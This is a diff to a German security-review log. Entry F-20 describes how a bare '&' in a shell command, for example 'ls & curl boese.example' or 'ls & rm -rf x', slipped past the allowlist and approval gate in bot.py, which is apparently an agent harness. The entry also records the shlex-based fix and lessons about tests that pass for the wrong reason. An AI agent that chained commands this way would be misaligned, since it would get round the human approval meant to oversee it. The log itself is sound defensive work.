@@ -2,7 +2,7 @@
 # F-Befunde der Gegenprüfung — Reihenfolge und Stand
 
 **Stichtag:** 2026-09-02 · **Stand: F-1 bis F-11 erledigt · F-12 bis F-17 offen ·
-F-18 erledigt · F-19 offen** (nachgetragen 02.09., stand seit dem 23.08. nur im
+F-18 erledigt · F-19 offen · F-20 behoben** (nachgetragen 02.09., stand seit dem 23.08. nur im
 Changelog)
 · **überholt durch:** — · **maßgeblich ist diese Datei** (Volltext der Befunde:
 `docs/gegenpruefung-2026-08-18.md`; die neuen aus
@@ -239,6 +239,71 @@ in drei von fünf Fällen mehr als das Gemeldete.
 Rückgabewert der einer erfolgreichen `tail` ist. Berichtigt in `111923b`; der
 rote Lauf hatte einen echten Fund enthalten (ein Prüfer mit fest verdrahtetem
 VPS-Pfad, der am Mac etwas anderes maß).
+
+---
+
+### F-20 · Das freistehende `&` umging die ganze Positivliste `[BEHOBEN 02.09.2026, am Tag des Fundes]`
+
+**Gefunden beim Aufräumen, nicht durch eine Prüfung** — und das ist der
+eigentliche Befund. Gemessen am 02.09.:
+
+```
+ls & curl boese.example   →  FREI
+ls & rm -rf x             →  FREI
+ls &wc                    →  FREI
+```
+
+**Ohne Rückfrage, in jedem Modus.** `bot.py` gibt bei `FREI` sofort frei
+(`bot.py:3198`); die Ausgangssperre `_AUSGEHENDE_BEFEHLE` sitzt **dahinter**
+und wurde nie erreicht. Der Auto-Zustand spielte keine Rolle — dies war auch
+im Genehmigen-Zustand offen.
+
+#### Wie es hineinkam
+
+`shlex.split("ls & curl x")` liefert `['ls', '&', 'curl', 'x']`. Das Verb ist
+`ls` und steht auf der Positivliste; `&`, `curl` und `x` tragen keinen
+Schrägstrich und werden von `_pfad_artig` übersprungen. **Die Shell führt
+beides aus, die Prüfung sah nur das erste.**
+
+`WEITERE_VERKETTUNG` hätte es fangen sollen und kennt `[;|]`, `\n`, `||` —
+**kein `&`**. Seit der Zerlegung vom 01.09. ist jene Zeile ohnehin
+**unerreichbar**: Was sie fängt, fängt die Zerlegung vorher (ausgeführt
+gemessen, keine Probe erreicht sie).
+
+**Vorbestehend, nicht neu** — gegen `395de2b` gemessen: dort ebenso frei.
+
+#### Die Behebung, und warum sie keine Textsuche ist
+
+`shlex` mit `punctuation_chars=True` trennt **quote-bewusst**: freies `&` wird
+ein eigenes Token, `&&` bleibt `&&`, und `"ESN & More"` bleibt **ein** Token.
+Der Ordner `Fitmart : ESN & More` existiert in Adams Rechnungsablage — eine
+Textsuche nach `&` hätte ihn bei jedem `grep` in den Dialog geschickt, und ein
+Filter, der grundlos anspringt, wird binnen einer Woche abgeschaltet.
+
+**DIALOG, nicht Zerlegung** — dieselbe Linie wie beim Zeilenumbruch: `&` war
+nicht beauftragt, und wo nichts entschieden wurde, gilt die konservative
+Richtung.
+
+#### Die Lehre, und sie wiegt schwerer als der Fund
+
+**Die Prüfzeilen zu dieser Schranke wären beinahe selbst zahnlos gewesen.** Von
+sechs zuerst notierten Fällen blieben zwei auch **ohne** die Schranke im
+Dialog — `ls&wc` fällt über die Positivliste (shlex macht daraus **ein** Wort),
+ein zweiter Pfad außerhalb der Bereiche über den Pfad. Zwei Zeilen wären **aus
+dem falschen Grund grün** gewesen und hätten eine spätere Entkernung gedeckt.
+Sie messen jetzt den **Grund**; die zwei doppelt gesicherten stehen getrennt
+daneben, damit niemand sie später als Beleg für die Schranke liest.
+
+*Wo Schutz und Zufall dasselbe Ergebnis liefern, misst man die Begründung* —
+zum dritten Mal in vier Tagen dieselbe Lehre, diesmal an einer Stelle, die
+scharf war.
+
+#### Was offen bleibt
+
+**`WEITERE_VERKETTUNG` ist toter Code** (ausgeführt gemessen). Nicht entfernt:
+Aufräumen gehört ans Abschluss-Audit (Phase 10), und eine Streichung im
+Sicherheitspfad am selben Tag wie eine Behebung ist genau die Art Arbeit, die
+etwas mitreißt. **Vermerkt statt getan.**
 
 ---
 
